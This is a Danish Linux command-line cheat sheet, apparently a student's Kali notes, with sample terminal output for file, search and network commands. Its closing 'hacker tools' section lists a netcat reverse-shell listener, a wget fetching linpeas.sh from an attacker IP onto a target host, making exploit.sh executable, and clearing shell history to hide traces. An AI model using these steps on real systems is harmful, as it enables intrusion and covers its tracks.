# Linux Kommandolinje
## directory traversal
1.1 pwd - Nuværende position i en sti
```bash
pwd
```
```console
┌──(kali㉿kali)-[~]
└─$ pwd         
/home/kali
```
1.2 skift directory/mappe
```bash
cd /your/path
```
```console
┌──(kali㉿kali)-[~]
└─$ cd /etc/                                
                                                                                                        
┌──(kali㉿kali)-[/etc]
└─$ 
```
1.3 dan dig et overblik over mapper og filer
```bash
tree
```
```console
┌──(kali㉿kali)-[/etc]
└─$ tree                      
.
├── adduser.conf
├── alsa
│   └── conf.d
│       ├── 10-rate-lav.conf -> /usr/share/alsa/alsa.conf.d/10-rate-lav.conf
│       ├── 10-samplerate.conf -> /usr/share/alsa/alsa.conf.d/10-samplerate.conf
│       ├── 10-speexrate.conf -> /usr/share/alsa/alsa.conf.d/10-speexrate.conf
│       ├── 50-arcam-av-ctl.conf -> /usr/share/alsa/alsa.conf.d/50-arcam-av-ctl.conf
│       ├── 50-jack.conf -> /usr/share/alsa/alsa.conf.d/50-jack.conf
│       ├── 50-oss.conf -> /usr/share/alsa/alsa.conf.d/50-oss.conf
│       ├── 50-pulseaudio.conf -> /usr/share/alsa/alsa.conf.d/50-pulseaudio.conf
│       ├── 60-a52-encoder.conf -> /usr/share/alsa/alsa.conf.d/60-a52-encoder.conf
│       ├── 60-speex.conf -> /usr/share/alsa/alsa.conf.d/60-speex.conf
│       ├── 60-upmix.conf -> /usr/share/alsa/alsa.conf.d/60-upmix.conf
│       ├── 60-vdownmix.conf -> /usr/share/alsa/alsa.conf.d/60-vdownmix.conf
│       ├── 98-usb-stream.conf -> /usr/share/alsa/alsa.conf.d/98-usb-stream.conf
│       ├── 99-pulseaudio-default.conf.example
│       └── 99-pulse.conf -> /usr/share/alsa/alsa.conf.d/pulse.conf
├── alternatives
│   ├── ABORT.7.gz -> /usr/share/postgresql/17/man/man7/ABORT.7.gz
│   ├── ALTER_AGGREGATE.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_AGGREGATE.7.gz
│   ├── ALTER_COLLATION.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_COLLATION.7.gz
│   ├── ALTER_CONVERSION.7.gz -> /usr/share/postgresql/17/man/man7/ALTER_CONVERSION.7.gz

```
1.4 Find en specific mappe eller fil
```bash
find -name "target.example"
```
```console
──(kali㉿kali)-[~]
└─$ find -name "passwords.txt"
./.cache/vmware/drag_and_drop/VW0wO7/passwords.txt
./.config/google-chrome/ZxcvbnData/3/passwords.txt
./.config/chromium/ZxcvbnData/3/passwords.txt
./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
./passwords.txt
```
1.5 Find en specific mappe eller fil uden at være case sensitive
```bash
find -iname "target.example"
```
```console
┌──(kali㉿kali)-[~]
└─$ find -iname "pAssWordS.txt"
./.cache/vmware/drag_and_drop/VW0wO7/passwords.txt
./.config/google-chrome/ZxcvbnData/3/passwords.txt
./.config/chromium/ZxcvbnData/3/passwords.txt
./.local/share/Trash/files/BastionHostingCreds (2)/passwords.txt
./passwords.txt
```
1.6 Find fil efter type
```bash
find , -name "*conf"
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -name "*.conf"      
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/etc/test.conf
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/etc/verysecret.conf
./.cache/vmware/drag_and_drop/hKonY4/python-opgaver/data/funny_config.conf
./.config/qt6ct/qt6ct.conf
./.goenv/versions/1.23.1/src/net/testdata/freebsd-usevc-resolv.conf
./.goenv/versions/1.23.1/src/net/testdata/linux-use-vc-resolv.conf
./.goenv/versions/1.23.1/src/net/testdata/large-ndots-resolv.conf
```
1.7 Find fil efter størrelse hvor "+100M" betyder mere end 100 Megabytes".  Med "/" for root og systemet og med "." for nuværende mappe.
```bash
find . -size +100M
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -size +100M 
./google-chrome-stable_current_amd64.deb
./google-chrome-stable_current_amd64.deb.1
./.BurpSuite/burpbrowser/139.0.7258.127/chrome
```
1.8 Find filer der er ændret for nyligt hvor "-10" betyder "less than 10". Med "/" for root og systemet og med "." for nuværende mappe.
```bash
find . -mmin -10
```
```console
┌──(kali㉿kali)-[~]
└─$ find . -mmin -10
.
./JustCreatedThisFile.txt
./.local/share/gvfs-metadata/home-16b65ecb.log
./.local/share/Trash/info
./.local/share/Trash/info/JustMadeThisFolder.txt.trashinfo
./.local/share/Trash/files
./.local/share/Trash/files/JustMadeThisFolder.txt
```

## 2. list (ls)
2.1 ls (list) - viser indholdet i den mappe du befinder dig i.
```bash
ls
```
```console
┌──(kali㉿kali)-[~]
└─$ ls    
1to100.py           fragmentation_scan.txt                    passwords.txt
AbuIshak.ovpn       google-chrome-stable_current_amd64.deb    Pictures
article.html        google-chrome-stable_current_amd64.deb.1  Public
combined.txt        mender.req                                replay_pid1882.log
Desktop             mender.txt                                Templates
```
2.2 for at se skjulte filer og rettigheder
```bash
ls -la
```
```console
└─$ la -la
total 265300
drwx------ 22 kali kali      4096 Dec  4 07:32 .
drwxr-xr-x  3 root root      4096 Sep  9 06:19 ..
-rw-rw-r--  1 kali kali       262 Nov  3 14:13 1to100.py
-rw-------  1 kali kali      8302 Oct 23 07:09 AbuIshak.ovpn
-rw-rw-r--  1 kali kali     36916 Oct 27 11:59 article.html
-rw-r--r--  1 kali kali       220 Sep  9 06:19 .bash_logout
-rw-r--r--  1 kali kali      6050 Oct 30 11:22 .bashrc
-rw-r--r--  1 kali kali      3526 Sep  9 06:19 .bashrc.original
drwx------  8 kali kali      4096 Nov 16 10:51 .BurpSuite
```
2.3 for at se alle filerne i human readable
```bash
ls -ah
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -ah
.                   .face.icon                                .pki
..                  fragmentation_scan.txt                    .profile
1to100.py           .gnupg                                    Public
AbuIshak.ovpn       .goenv                                    .pyenv
article.html        google-chrome-stable_current_amd64.deb    replay_pid1882.log
.bash_logout        google-chrome-stable_current_amd64.deb.1  .ssh
.bashrc             .ICEauthority                             .sudo_as_admin_successful
.bashrc.original    .java                                     Templates
.BurpSuite          .local                                    udp_scan.txt
.cache              mender.req                                userpass.txt
```
2.4 Se filstørrelse i humand readable
```bash
ls -lh
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -lh
total 259M
-rw-rw-r-- 1 kali kali  262 Nov  3 14:13 1to100.py
-rw------- 1 kali kali 8.2K Oct 23 07:09 AbuIshak.ovpn
-rw-rw-r-- 1 kali kali  37K Oct 27 11:59 article.html
-rw-r--r-- 1 kali kali 3.6K Aug 16  2021 combined.txt
drwxr-xr-x 2 kali kali 4.0K Oct 30 11:31 Desktop
drwxr-xr-x 2 kali kali 4.0K Oct 23 06:27 Documents
drwxr-xr-x 2 kali kali 4.0K Nov 22 13:46 Downloads
-rw-r--r-- 1 kali kali 2.8K Aug  9  2021 emails.txt
```
2.5 hvis du ønsker at sortere med sidst ændret først (brug -tr for omvendt rækkefølge)
```bash
ls -t
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -t 
udp_scan.txt            Downloads                                 extract_article.py  Pictures
fragmentation_scan.txt  google-chrome-stable_current_amd64.deb    article.html        Public
mender.txt              google-chrome-stable_current_amd64.deb.1  replay_pid1882.log  Templates
mender.req              numbers.txt                               ngrok               Videos
userpass.txt            1to100.py                                 AbuIshak.ovpn       combined.txt
passwords.txt           Desktop                                   Documents           emails.txt
users.txt               ngrok-v3-stable-linux-amd64.tgz           Music
```
2.6 Sorteret med sidst ændret først og skjulte filer inkluderet (brug -atr for omvendt rækkefølge)
```bash
ls -at
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -at
.                                         numbers.txt                      .java
.xsession-errors                          1to100.py                        .gnupg
.Xauthority                               Desktop                          .ICEauthority
.xsession-errors.old                      .bashrc                          Documents
.zsh_history                              .zshrc                           Music
udp_scan.txt                              .pyenv                           Pictures
fragmentation_scan.txt                    .goenv                           Public
```
2.7 Sorteret efter størrelse, største først (brug --lSr for omvendt rækkefølge)
```bash
ls -lS
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -lS             
total 265164
-rw-rw-r-- 1 kali kali 117773952 Nov 11 13:52 google-chrome-stable_current_amd64.deb
-rw-rw-r-- 1 kali kali 117773952 Nov 11 13:52 google-chrome-stable_current_amd64.deb.1
-rwxr-xr-x 1 kali kali  25268408 Oct 23 17:58 ngrok
-rw-rw-r-- 1 kali kali   9322550 Oct 30 05:29 ngrok-v3-stable-linux-amd64.tgz
-rw-rw-r-- 1 kali kali   1227855 Oct 27 07:55 replay_pid1882.log
-rw-rw-r-- 1 kali kali     36916 Oct 27 11:59 article.html
-rw------- 1 kali kali      8302 Oct 23 07:09 AbuIshak.ovpn
drwxr-xr-x 2 kali kali      4096 Oct 30 11:31 Desktop
```
2.8 Se alle filer i en mappe med dens under-mapper og filer
```bash
ls -R
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -R
.:
1to100.py      extract_article.py                        ngrok                            Templates
AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-amd64.tgz  udp_scan.txt
article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
Desktop        JustCreatedThisFile.txt                   Pictures                         Videos
Documents      mender.req                                Public
Downloads      mender.txt                                python-opgaver
emails.txt     Music                                     replay_pid1882.log

./Desktop:

./Documents:

./Downloads:
cacert.der  chinese-names.txt.gz  >>>>>>>>> >>>>>>>>> DenneFilLiggerIDownloads.txt <<<<<<<<< <<<<<<<<<
```
2.9 Klassificer filetyper, for en klar forståelse. Denne sætter eksempelvis et "*" på slutningen af filer som kan køres
```bash
ls -F
```
```console
┌──(kali㉿kali)-[~]
└─$ ls -F
1to100.py      extract_article.py                        ngrok*                           Templates/
AbuIshak.ovpn  fragmentation_scan.txt                    ngrok-v3-stable-linux-amd64.tgz  udp_scan.txt
article.html   google-chrome-stable_current_amd64.deb    numbers.txt                      userpass.txt
combined.txt   google-chrome-stable_current_amd64.deb.1  passwords.txt                    users.txt
```
## 3. Læsning og inspektion af filer
3.1 Print alt indeholdet af en fil ud på en gang
```bash
cat target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ cat userpass.txt 
root toor
admin password
user 123456
guest admin
```
3.2 Åben en fil i en "reader-mode" hvor du kan scroll op og ned (tryk CTRL+Z for at komme ud af filen)
```bash
less target.file
```
```console
flowers
cristian
tintin
bianca
chrisbrown
chester
101010
smokey
silver
internet
sweet
strawberry
garfield
dennis
panget
francis
cassie
benfica
love123
:
(END)
```
3.3 Læs en fils første 10 linjer (brug -n xyz for et specifikt antal linjer fra første linje)
```bash
head target.file
```
```console
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ head rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```
3.4 Læs en fils sidste 10 linjer 
```bash
tail target.file
```
```console
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ tail rockyou.txt                        
       1234567
       1
                  
            
           
▒xCvBnM,
ie168
abygurl69
a6_123
*7¡Vamos!
```
3.5 Læs en fils sidste 10 linjer og følg med live på de nyeste tilføjelser
```bash
tail -f target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ tail -f TestFil.txt
hej
h
23
jj32j9
ksadkaskdad12283129asd
ads1237asdh92ghad
7129afladas87zxfjfaksdasdh
1283nasfdA 8AWd
sadja9fgaj
sidste
denne linje er sat på live
```
3.6 Søg efter en specifik tekst inde i en fil der kun de linjer der matcher (brug -i option for at søge case-insensitive)
```bash
grep "søgeord" target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ grep "h" TestFil.txt                       
hej
h
ads1237asdh92ghad
7129afladas87zxfjfaksdasdh
```
3.7 Find ud af hvilken type en fil er (bruges fordi en fil kan have et fake filnavn for skjule information)
```bash
file target.file
```
```console
┌──(kali㉿kali)-[~]
└─$ file TestFil.txt
TestFil.txt: Unicode text, UTF-8 text
```
## 4. Fil manipulation
4.1 Output file direction med ">"
```bash
example.scan > ScanList.txt
```
```console
──(kali㉿kali)-[~]
└─$ ls -ah > fil_liste.txt 

┌──(kali㉿kali)-[~]
└─$ cat fil_liste.txt
.
..
1to100.py
AbuIshak.ovpn
article.html
.bash_logout
.bashrc
.bashrc.original
.BurpSuite
.cache
combined.txt
.config
Desktop
.dmrc
```
4.2 Tilføj noget til en fil med eksempelvis echo og ">>"
```bash
echo TargetText >> TargetFile.txt                    
```
```console
┌──(kali㉿kali)-[~]
└─$ echo TargetText >> TestFil2.txt              
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt               
Test2
Test2Fil
TestFil.txt
TargetText
```
4.3 Tag outputtet fra noget i venstre side og giv det til noget i højre ned Pipe " | ". 
```bash
cat Example.file | grep "Example Text"                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | grep "Target"
TargetText                 
```
Du kan eksempelvis også tail -f en fil også pipe den til en grep "søgeord" for at se om der bliver tilføjet det søgeord live til den fil du follower
```bash
tail -f TestFil2.txt | grep "Important Keyword"              
```
Egentlig kan du pipe uendeligt til dine egne behov. Her er en pipe der først henter data fra en fil, filtrerer dataen, sorterer det, fjerner alle doubles (uniq) og til sidst skærer alt andet fra og viser kun de 5 øverste resultater.
```bash
cat list.txt | grep "admin" | sort | uniq | head -n 5            
```
4.3 Tekst-editor i kommandolinjen. Brug nano til at manuelt at skrive i en fil
```bash
nano Example.File             
```
4.4 Fjern eller erstat et tegn i en fil
```bash
cat Example.File | tr "A" "B"                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt
Test2
Test2Fil
TestFil.txt
TargetText
GammelText

┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | tr "G" "A"               
Test2
Test2Fil
TestFil.txt
TargetText
AammelText              
```
4.5 Erstat et ord med et andet
```bash
cat Example.File | sed 's/OldWord/NewWord/g'                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cat TestFil2.txt | sed 's/GammelText/NyText/g'
Test2
Test2Fil
TestFil.txt
TargetText
NyText
```
4.6 opret en ny tom fil
```bash
touch Example.File               
```
```console
┌──(kali㉿kali)-[~]
└─$ touch NyFil.txt  
```
4.7 kopierer en fil
```bash
cp Example.file copy                  
```
```console
┌──(kali㉿kali)-[~]
└─$ cp NyFil.txt NyFil2.txt   
```
4.8 slet en fil
```bash
rm Example.file         
```
```console
└─$ rm NyFil2.txt  
```
4.9 fjern en mappe og alt hvad der i den uden at spørge om lov
```bash
rm -rf Folder         
```

## 5. Netværk
5.1 se din IP adresser 
```bash
ip a
```
5.2 Ping en host for at se om den er live 
```bash
pink [host]
```
```console
┌──(kali㉿kali)-[~]
└─$ ping dr.dk
PING dr.dk (95.166.124.137) 56(84) bytes of data.
64 bytes from 95.166.124.137: icmp_seq=1 ttl=60 time=2.68 ms
--- dr.dk ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2.679/2.679/2.679/0.000 ms
```
5.3 Secure Shell login på en fjerncomputer, krypteret
```bash
ssh username@host
```
Kan tilføje -i hvis der skal knyttes en nøglefil til loginet
5.4 Slå et domænenavn op for at finde IP-adressen
```bash
nslookup google.com
```
```console
┌──(kali㉿kali)-[~]
└─$ nslookup google.com
Server:         192.168.1.1
Address:        192.168.1.1#53

Non-authoritative answer:
Name:   google.com
Address: 216.58.207.238
Name:   google.com
Address: 2a00:1450:400f:803::200e
```
5.5 Hvis du vil se hvilken rute din afsendte pakker tager fra din computer til målet
```bash
traceroute host
```
```console
┌──(kali㉿kali)-[~]
└─$ traceroute google.com     
traceroute to google.com (216.58.207.238), 30 hops max, 60 byte packets
 1  192.168.1.1 (192.168.1.1)  0.496 ms  0.459 ms  0.530 ms
 2  hidden
 3  hidden
 4  hidden  13.652 ms  12.857 ms  13.618 ms
 5  hidden  14.512 ms hidden  14.496 ms  14.475 ms
 6  209.85.242.83 (209.85.242.83)  15.126 ms  13.911 ms  15.923 ms
 7  arn09s19-in-f14.1e100.net (216.58.207.238)  11.719 ms  12.255 ms  11.675 ms
```
## 6. Hacker Værktøjer
6.1 Åben en "lytte-port" på din egen maskine som venter på noget forbinder tilbage til din maskine
```bash
nc lvnp 4444        
```
```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444    
listening on [any] 4444 ...
```
6.2 Omdan en mappe til en hjemmeside og download dine filer fra target host
```bash
pyton3 -m http.server [port]      
```
6.3 Download som bruges på target host til at hente filer fra din maskine
```bash
wget http://10.10.10.5:8000/linpeas.sh   
```
6.4 Gør en fil runable, eksempelvis en ond tekstfil som bliver til et script efter den bliver gjort runable
```bash
chmod +x exploit.sh
```
6.5 Slet terminalens hukommelse og logud så der er færre spor af dit besøg på target host
```bash
history -c && exit
```
